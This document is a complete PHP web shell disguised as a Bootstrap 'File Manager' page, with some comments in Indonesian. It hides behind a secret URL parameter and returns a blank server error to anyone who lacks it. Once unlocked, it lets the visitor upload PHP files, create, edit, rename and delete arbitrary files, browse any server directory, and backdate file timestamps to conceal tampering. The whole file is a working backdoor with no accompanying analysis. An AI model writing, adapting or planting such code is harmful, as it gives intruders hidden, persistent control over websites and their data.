<?php
// Cek jika parameter 'kurlung' ada di URL
if (!isset($_GET['kurlung'])) {
    // Jika tidak ada, tampilkan error 500
    http_response_code(500);
    echo "";
    exit(); // Hentikan eksekusi script jika parameter tidak ada
}

// Function to check if the file is readable
function getFilePermissions($filePath) {
    return is_readable($filePath) ? 'readable' : 'not readable';
}

// Function to get all directories and files
function getDirectoryContents($directory) {
    $items = scandir($directory);
    return array_diff($items, array('.', '..')); // Remove '.' and '..'
}

// Handle file creation
if (isset($_POST['createFile'])) {
    $fileName = $_POST['fileName'];
    $fileContent = $_POST['fileContent'];

    if (!empty($fileName) && !empty($fileContent)) {
        if (file_put_contents($fileName, $fileContent) !== false) {
            echo "<p class='alert alert-success' id='alert'>File '$fileName' created successfully!</p>";
        } else {
            echo "<p class='alert alert-danger' id='alert'>Failed to create the file.</p>";
        }
    } else {
        echo "<p class='alert alert-warning' id='alert'>File name and content cannot be empty.</p>";
    }
}

// Handle folder creation
if (isset($_POST['createFolder'])) {
    $folderName = $_POST['folderName'];

    if (!empty($folderName)) {
        if (!file_exists($folderName)) {
            mkdir($folderName, 0777, true);
            echo "<p class='alert alert-success' id='alert'>Folder '$folderName' created successfully!</p>";
        } else {
            echo "<p class='alert alert-warning' id='alert'>Folder '$folderName' already exists.</p>";
        }
    } else {
        echo "<p class='alert alert-warning' id='alert'>Folder name cannot be empty.</p>";
    }
}

// Handle file upload
if (isset($_FILES['fileUpload'])) {
    $fileName = $_FILES['fileUpload']['name'];
    $fileTmpName = $_FILES['fileUpload']['tmp_name'];
    $fileSize = $_FILES['fileUpload']['size'];
    $fileError = $_FILES['fileUpload']['error'];
    $fileType = $_FILES['fileUpload']['type'];

    // Allowed file extensions
    $allowed = ['php', 'html', 'jpg', 'png'];
    $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

    if (in_array($fileExt, $allowed)) {
        if ($fileError === 0) {
            // Upload the file to the current directory
            $fileDestination = __DIR__ . '/' . basename($fileName);
            if (move_uploaded_file($fileTmpName, $fileDestination)) {
                echo "<p class='alert alert-success' id='alert'>File uploaded successfully: <a href='" . basename($fileName) . "'>" . basename($fileName) . "</a></p>";
            } else {
                echo "<p class='alert alert-danger' id='alert'>Failed to upload file.</p>";
            }
        } else {
            echo "<p class='alert alert-danger' id='alert'>Error uploading file.</p>";
        }
    } else {
        echo "<p class='alert alert-warning' id='alert'>Invalid file type!</p>";
    }
}

// Get all files in the current directory
$directoryPath = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

// Ensure the directory is a valid path within the allowed directories
$directoryPath = realpath($directoryPath);

// Check if the directory exists and is a directory
if ($directoryPath && is_dir($directoryPath)) {
    $files = getDirectoryContents($directoryPath);
} else {
    // Handle the error if directory doesn't exist or is invalid
    http_response_code(500);
    die("Error: The specified directory does not exist or is invalid.");
}

// Handle file editing
if (isset($_POST['saveFile'])) {
    $fileToEdit = $_POST['fileToEdit'];
    $fileContent = $_POST['fileContent'];

    if (file_put_contents($fileToEdit, $fileContent) !== false) {
        echo "<p class='alert alert-success' id='alert'>File '$fileToEdit' edited successfully!</p>";
    } else {
        echo "<p class='alert alert-danger' id='alert'>Failed to edit the file.</p>";
    }
}

// Handle renaming a file
if (isset($_POST['renameFile'])) {
    $fileToRename = $_POST['fileToRename'];
    $newFileName = $_POST['newFileName'];

    if (rename($fileToRename, $newFileName)) {
        echo "<p class='alert alert-success' id='alert'>File renamed to '$newFileName'.</p>";
    } else {
        echo "<p class='alert alert-danger' id='alert'>Failed to rename the file.</p>";
    }
}

// Handle removing a file
if (isset($_GET['remove'])) {
    $fileToRemove = $_GET['remove'];
    if (is_file($fileToRemove)) {
        if (unlink($fileToRemove)) {
            echo "<p class='alert alert-success' id='alert'>File $fileToRemove has been deleted successfully.</p>";
        } else {
            echo "<p class='alert alert-danger' id='alert'>Failed to delete the file.</p>";
        }
    } else {
        echo "<p class='alert alert-danger' id='alert'>File not found for deletion.</p>";
    }
}

// Handle file date edit
if (isset($_POST['editDate'])) {
    $fileToEditDate = $_POST['fileToEditDate'];
    $newDate = strtotime($_POST['newDate']); // Convert to timestamp

    if (touch($fileToEditDate, $newDate)) {
        echo "<p class='alert alert-success' id='alert'>File date updated successfully!</p>";
    } else {
        echo "<p class='alert alert-danger' id='alert'>Failed to update file date.</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
    <style>
        .alert {
            position: fixed;
            top: 10px;
            right: 10px;
            z-index: 9999;
            width: auto;
            max-width: 100%;
        }

        .breadcrumb {
            background-color: transparent;
            padding-left: 0;
        }

        .breadcrumb-item {
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="col-12">
        <div class="container">
            <h2 class="p-2 text-center text-primary">File Management</h2>
        </div>
    </div>
    <hr>
    <main>
        <div class="d-flex justify-content-center align-items-center h-100">
            <div class="container bg-light p-5 rounded">
                <h3>Manage Files</h3>

                <!-- File creation -->
                <form method="POST">
                    <div class="mb-3">
                        <label for="fileName" class="form-label">Create a File</label>
                        <input type="text" class="form-control" name="fileName" id="fileName" placeholder="Enter file name (e.g., index.php)">
                    </div>
                    <div class="mb-3">
                        <label for="fileContent" class="form-label">File Content</label>
                        <textarea class="form-control" name="fileContent" id="fileContent" rows="5" placeholder="Enter file content"></textarea>
                    </div>
                    <button type="submit" name="createFile" class="btn btn-primary mb-3">Create a File</button>
                </form>

                <!-- Folder creation -->
                <form method="POST">
                    <div class="mb-3">
                        <label for="folderName" class="form-label">Create a Folder</label>
                        <input type="text" class="form-control" name="folderName" id="folderName" placeholder="Enter folder name">
                    </div>
                    <button type="submit" name="createFolder" class="btn btn-secondary mb-3">Create a Folder</button>
                </form>

                <!-- File Upload -->
                <form action="" method="POST" enctype="multipart/form-data">
                    <div class="mb-3">
                        <label for="fileUpload" class="form-label">Upload File</label>
                        <input type="file" class="form-control" id="fileUpload" name="fileUpload" accept=".php,.html,.jpg,.png" required>
                    </div>
                    <button type="submit" class="btn btn-success">Upload File</button>
                </form>

                <hr>

                <!-- Current Directory Path -->
                <div class="mb-3">
                    <label for="path" class="form-label">Current Directory Path:</label>
                    <div id="path" class="breadcrumb">
                        <?php
                        // Ambil directoryPath relatif
                        $relativePath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $directoryPath);
                        $pathParts = explode(DIRECTORY_SEPARATOR, trim($relativePath, DIRECTORY_SEPARATOR));
                        $currentPath = '';

                        foreach ($pathParts as $key => $part) {
                            $currentPath .= $part . DIRECTORY_SEPARATOR;

                            if ($key == count($pathParts) - 1) {
                                echo "<span class='breadcrumb-item active'>$part</span>";
                            } else {
                                $safePart = urlencode($part);
                                $url = "?dir=" . urlencode(rtrim($currentPath, DIRECTORY_SEPARATOR));
                                echo "<a class='breadcrumb-item' href='$url'>$part</a>";
                            }

                            if ($key < count($pathParts) - 1) {
                                echo " / ";
                            }
                        }
                        ?>
                    </div>
                </div>

                <!-- List of files and directories -->
                <ul class="list-group">
                    <?php foreach ($files as $file): ?>
                        <li class="list-group-item">
                            <a href="?dir=<?php echo urlencode($directoryPath . DIRECTORY_SEPARATOR . $file); ?>">
                                <?php echo $file; ?>
                            </a>
                        </li>
                    <?php endforeach; ?>
                </ul>
            </div>
        </div>
    </main>
</body>
</html>
